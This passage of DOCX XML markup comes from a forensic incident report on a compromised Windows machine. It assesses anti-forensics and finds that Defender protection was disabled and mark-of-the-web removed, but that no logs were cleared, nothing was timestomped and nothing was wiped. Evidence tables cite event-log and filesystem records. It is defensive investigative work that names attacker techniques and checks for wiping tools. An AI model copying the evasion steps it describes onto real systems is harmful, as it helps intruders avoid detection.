            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16207</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>size=7168</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#27972</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.11 Defense evasion and anti-forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Defense evasion and anti-forensics review.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Log clearing: none found.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No Security 1102, no System 104 and no 4719.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- EventRecordIDs have no gaps in Security (1–2457), System (1–994), both PowerShell channels and Defender/Operational.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The six Security 1100 events are normal shutdowns before the 01:24 boot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Defender:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The attacker turned Defender off at 03:39:45–49 (5001, and 5007 for SpyNet 2→0, SubmitSamples 1→0, TamperProtection 0x1→0x4), as already reported in F-007.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- It stayed off until acquisition: DisableRealtimeMonitoring=1 is still in the hive, there is no re-enable event and no detection for coreupdater.exe or the PowerShell loader.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No exclusions were set (registry Exclusions keys and the MPLog lists are empty).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- I added the registry rows to F-007 as corroboration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Timestomping: none on attacker files.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The SI&lt;FN and uSecZeros hits are files and folders laid down when the OS image was deployed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- coreupdater.exe's $SI times match the $J timestamps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Deletion and wiping:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No deletions in Prefetch, the event-log folder or the Recycle Bin, and no wiping tools on disk.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The only attacker deletions are the Edge partial and cache copies of coreupdater.exe and the loot.zip archive (already in F-026).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Clock changes: all 4616 and Kernel-General 1 events come from W32Time or the clock resync when the VM resumed at 03:13.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Memory:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No hidden processes (psxview), PEB spoofing or unlinked DLLs.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The injection findings stand (F-015 spoolsv, F-016 PowerShell). I added the RWX thread start in PowerShell PID 3316 to F-016.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The MsMpEng malfind hit and the non-file-backed thread starts are false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Recorded: F-030 (overall assessment), T-024, and a note listing the false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-030: Defense-evasion / anti-forensics assessment: no log clearing, no timestomping, no wiping; only evasion = Defender weakening (persisting until acquisition) and MOTW removal</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E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</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artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>anti-forensics</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1562.001, T1070</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379 → 2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>FACTS (all UTC):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1) Event-log clearing: no Security 1102 and no System 104 (EventLog) anywhere in raw.evtx; the 1102/104 IDs present belong to unrelated channels (ShellCommon-StartLayoutPopulation, StateRepository, DeviceManagement, RdpCoreTS). EventRecordIDs are contiguous with no gap: Security 1–2457 (2020-09-18 04:58:02 → 2020-09-19 05:18:23), System 1–994, Windows PowerShell 1–15, PowerShell/Operational 1–9, Defender/Operational 1–41. Security 1100 (6 events) are shutdowns, the last at 2020-09-19 01:08:35, before the 01:24:04 boot. No 4719 (audit policy change).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2) Defender: 5001 at 03:39:45 (RTP disabled) and 5007 SpyNetReporting 2→0 (03:39:46), SubmitSamplesConsent 1→0 (03:39:47), Features\TamperProtection 0x1→0x4 (03:39:49) (evtx rows 35493-35496). SOFTWARE hive at acquisition still holds Real-Time Protection\DisableRealtimeMonitoring=1 (LastWrite 03:39:44.30), Spynet\SpyNetReporting=0 / SubmitSamplesConsent=0 (LastWrite 03:39:47.79). No 5000/5004 re-enable afterwards; only 1151 health reports at 03:42:52 and 04:42:52; no 1116/1117 detection for coreupdater.exe or the PowerShell loader. Defender Exclusions\Paths/Processes/Extensions/IpAddresses/TemporaryPaths keys are empty (LastWrite 2020-09-18 22:52:57, pre-incident); MPLog shows empty exclusion lists.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3) Timestomping: raw.mft SI&lt;FN / uSecZeros hits in the 03:30–05:08 window are only OS-image files/directories (FN Created 2020-09-18 06:35–06:38 = image deployment, e.g. System32\ExplorerFrame.dll, CHXSmartScreen.exe, SecHealthUI.exe) and Search/Temp files with vendor timestamps. Attacker artifacts are coherent: C:\Windows\System32\coreupdater.exe (MFT row 27972) SI Created 03:40:00.69 / Modified 03:40:00.86 / RecordChange 03:40:49.33 match $J (download/rename/move/MOTW removal); Prefetch COREUPDATER.EXE-157C54BB.pf created 03:40:59.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4) Deletion / wiping: $J FileDelete records after 03:30 are OneDrive per-user setup, Edge cache, Explorer/Search temp files, plus attacker-relevant deletions already reported (coreupdater.exe partial/cache copies at 03:40:00, loot.zip at 03:47:09 – F-026) and PowerShell __PSScriptPolicyTest_*.ps1 (05:08:39/05:08:43, benign PowerShell artefact of the Run-key loader). No deletion in \Windows\Prefetch, \winevt\Logs or $Recycle.Bin; no sdelete/cipher/CCleaner/BleachBit/wevtutil/timestomp binaries in $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>5) System time: all 4616/Kernel-General 1 events are svchost.exe (LogonId 0x3E5, W32Time) or "System time synchronized with the hardware clock" (03:13:20, OldTime 01:54:39 = VM suspend/resume); none in the attacker window 03:36–03:52 or at 05:08.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6) PowerShell logging was not disabled through policy (no ScriptBlockLogging/ModuleLogging values in the hive); PowerShell channels simply only contain the 05:08 loader activity.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>7) Memory: no hidden process (psxview: no process absent from pslist without ExitTime), no PEB masquerading, no unlinked DLLs (ldrmodules). Injection already reported (F-015 spoolsv PID 2188, F-016 powershell PID 3316 incl. RWX thread start). MsMpEng.exe PID 2404 RWX malfind hit and non-file-backed thread starts in Edge/Search/svchost/WmiPrvSE are false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The attacker's evasion was limited to (a) switching off Defender RTP/MAPS/sample submission through the Windows Security GUI (SecHealthUI, F-007/F-027) just before downloading coreupdater.exe, a state that persisted until acquisition and explains the absence of any Defender detection of the unobfuscated Metasploit payload and loader; the TamperProtection value change 0x1→0x4 is consistent with tamper protection being reported off (value semantics vary by platform version – interpretation probable); (b) removal of the Zone.Identifier MOTW at execution (F-029); (c) in-memory techniques (process migration into spoolsv.exe, reflective loading in PowerShell, fileless registry payload). There is no indication of log clearing, timestomping, wiping, prefetch deletion or clock manipulation: the attacker left coreupdater.exe, the service and the Run key in place. The loot.zip deletion (permanent, Shift+Del) is a cleanup of the staging archive only. Absence statements are backed by available sources (Security/System/PowerShell/Defender EVTX complete with contiguous RecordIDs, $MFT, $J 01:31→05:17, memory image). Limitation: $J starts at 01:31:32, so deletions before that are not visible.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (10)</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03:39:45.247925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | %%827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35493</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:49.843705</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5007 | Microsoft-Windows-Windows Defender | The antimalware platform configuration changed | Old Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#35496</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:44.301917</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Real-Time Protection</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | DisableRealtimeMonitoring=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8622</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Exclusions\Paths</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8632</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.691657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>size=7168</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#27972</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=87470-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:20.501601</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 1 | Microsoft-Windows-Kernel-General | The system time was changed | OldTime: 2020-09-19 01:54:39.6645222 | NewTime: 2020-09-19 03:13:20.5000000 | Reason: System time synchronized with the hardware clock.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:28.318873</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2020-09-19 03:13:28.3154393 | NewTime: 2020-09-19 03:13:28.3183014 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39496</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
